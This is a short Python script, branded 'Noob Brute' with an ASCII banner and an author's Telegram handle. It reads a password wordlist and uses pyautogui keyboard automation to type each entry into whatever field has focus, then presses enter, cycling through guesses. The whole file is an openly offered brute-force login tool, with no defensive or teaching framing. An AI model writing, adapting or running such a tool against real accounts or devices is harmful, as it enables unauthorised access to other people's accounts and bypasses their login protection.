import pyautogui
import time
from rich import print as pr

pr("""[magenta]

███╗░░██╗░█████╗░░█████╗░██████╗░  ██████╗░██████╗░██╗░░░██╗████████╗███████╗
████╗░██║██╔══██╗██╔══██╗██╔══██╗  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
██╔██╗██║██║░░██║██║░░██║██████╦╝  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
██║╚████║██║░░██║██║░░██║██╔══██╗  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
██║░╚███║╚█████╔╝╚█████╔╝██████╦╝  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
╚═╝░░╚══╝░╚════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝[/magenta]""")
print("\n")
pr("[red]""made by : salehBNG\ntelegram : @SalehBNG0 \n -----------------------""[/red]")
print("\n")
passwords = open(input("enter your password list : "))

def write_and_clear(password):
    pyautogui.typewrite(password)
    time.sleep(1)
    pyautogui.press("backspace", presses=len(password))

    time.sleep(1)
def write_passwords_and_enter():
    for password in passwords:
    	write_and_clear(password)
    	pyautogui.press("enter")


write_passwords_and_enter()
